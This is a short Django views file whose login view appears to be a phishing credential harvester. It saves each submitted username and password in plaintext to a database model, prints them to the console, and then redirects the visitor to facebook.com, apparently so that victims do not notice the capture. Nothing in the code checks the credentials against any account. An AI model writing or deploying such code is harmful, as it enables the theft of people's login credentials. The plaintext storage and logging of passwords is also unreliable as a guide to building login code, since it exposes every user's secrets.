from django.shortcuts import render,redirect
from .models import Usera
def test(request):
    return render(request,'login.html')
def login(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        if (username=="") or (password==""):
            return redirect('login')
        else: 
            user = Usera(username = username,password = password)
            print(user.username, user.password)
            user.save()
            print("Succesfully")                                
            return redirect('https://facebook.com')
    context ={
    }
    return render(request,'diendan.html',context)
# Create your views here.
